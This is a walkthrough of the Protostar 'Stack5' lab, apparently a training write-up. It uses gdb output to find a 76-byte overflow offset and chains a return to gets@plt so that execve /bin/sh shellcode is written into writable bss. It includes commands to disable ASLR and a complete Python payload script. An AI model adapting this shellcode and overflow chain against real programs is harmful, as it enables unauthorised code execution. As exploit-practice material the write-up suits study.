# Stack 5
## Overview
    We need to use the ret2libc technique to solve problem Stack5.
    Note: You need to close ASLR.
        $ sudo -s 
        Enter root password.
        # sudo echo 0 > /proc/sys/kernel/randomize_va_space
        # exit
        ---------------------------------------------------------
        Turn on ASLR if you're done.
        $ sudo -s 
        Enter root password.
        # sudo echo 2 > /proc/sys/kernel/randomize_va_space
        # exit
    Please read the "Method" part first before you read the "Process" part.
## Process
    1. Find number of paddings needed.
        (gdb) disas main
            Dump of assembler code for function main:
               0x080483c4 <+0>:     push   %ebp
               0x080483c5 <+1>:     mov    %esp,%ebp
               0x080483c7 <+3>:     and    $0xfffffff0,%esp
               0x080483ca <+6>:     sub    $0x50,%esp
               0x080483cd <+9>:     lea    0x10(%esp),%eax
               0x080483d1 <+13>:    mov    %eax,(%esp)
               0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
               0x080483d9 <+21>:    leave
               0x080483da <+22>:    ret
            End of assembler dump.
        (gdb) b *main+21
            Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
        (gdb) r
            Starting program:/home/mickey/Desktop
                            /protostar_exploit_practice/stack5
            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            Breakpoint 1, main (argc=1, argv=0xffffd684) at stack5/stack5.c:11
            11      stack5/stack5.c: No such file or directory.
        (gdb) x/28x $esp
            0xffffd590: 0xffffd5a0  0x0000002f  0xf7e12dc8  0xf7fd5858
            0xffffd5a0: 0x41414141  0x41414141  0x41414141  0x41414141
            0xffffd5b0: 0x41414141  0x41414141  0x41414141  0x41414141
            0xffffd5c0: 0x41414141  0x41414141  0x00414141  0xf7e34c0b
            0xffffd5d0: 0xf7fb83dc  0x080481e4  0x080483fb  0x00000000
            0xffffd5e0: 0xf7fb8000  0xf7fb8000  0x00000000  0xf7e1e637
            0xffffd5f0: 0x00000001  0xffffd684  0xffffd68c  0x00000000
        (gdb) x/x $ebp+4
            0xffffd5ec: 0xf7e1e637
    
        It is showed that As are stored from the first stack of line 0xffffd5a0
        to the third stack of line 0xffffd5c0.
        In order to reach the return address (last stack at line 0xffffd5e0), 
        we need 76 bytes to overwrite the space from 0xffffd5a0 to 0xffffd5e8.
    
    2. Find where gets function is stored.
        $ gdb -q ./stack5
        (gdb) info func
            All defined functions:
            File stack5/stack5.c:
            int main(int, char **);
            Non-debugging symbols:
            0x08048298  _init
            0x080482d8  __gmon_start__@plt
            0x080482e8  gets@plt
            0x080482f8  __libc_start_main@plt
            0x08048310  _start
            0x08048340  __do_global_dtors_aux
            0x080483a0  frame_dummy
            0x080483e0  __libc_csu_fini
            0x080483f0  __libc_csu_init
            0x0804844a  __i686.get_pc_thunk.bx
            0x08048450  __do_global_ctors_aux
            0x0804847c  _fini
    You can see the gets function is stored at 0x080482e8.
    
    3. Find bss_addr.
        Use IDA pro to find the last line of the binary file stored.
        In this case, the last line is abs:080496DC    end _start,
        so we take 080496DC as bss_addr.
    
    4. Search for usable shellcode from http://shell-storm.org/shellcode/
        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89
                     \xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    
    
## Method
    The rough concept is to key in "paddings + gets_addr + bss_addr + bss_addr 
    + '\n' + shellcode + '\n'".
    As problem Stack4, we need to use 76 bytes to overwrite the space of buffer
    (Paddings) and then overwrite the old return address with the one we want
    (gets_addr).
    Since the gets function in stack5.c may take the start of key in string to 
    newline character ("paddings + gets_addr + bss_addr + bss_addr + '\n') 
    as input, these read in data will be stored in stack as shown below.
                        esp-> -------------------
                                    paddings
                        ebp-> -------------------
                              ret addr (gets_addr)
                             -------------------
                                    bss_addr
                              -------------------
                                    bss_addr
                              -------------------
    After executing the gets function (stores the input data into stack), the 
    computer will then go to ebp+4 (ret addr). 
    The return address is set to the the address where gets function is
    stored (gets_addr), so the computer will then think there's another
    gets needs to be executed.
    The computer then takes first bss_addr as its return address, and second
    bss_addr as its parameter (where input data is stored).
    Thus, the remained key in string (shellcode + '\n') is taken as input to 
    this puts function and is stored at bss_addr.
    To be notice, bss_addr needs to be somewhere nothing is stored and has the 
    priviledge of rwx.
    
     
    
## Answer
    
    create stack5.py 
        import struct
        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89
                    \xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
        payload = ""
        payload += "A"*76  #junk
        payload += struct.pack("<I",0x080482e8)  #plt_gets
        payload += struct.pack("<I",0x080496DC)  #rwx bss
        payload += struct.pack("<I",0x080496DC)  #rwx bss
        payload += "\n"
        payload += shellcode
        payload += "\n"
        print payload


    $ (python /home/mickey/Desktop/protostar/stack5.py ; cat ) | ./stack5
    ls
    ....files listed
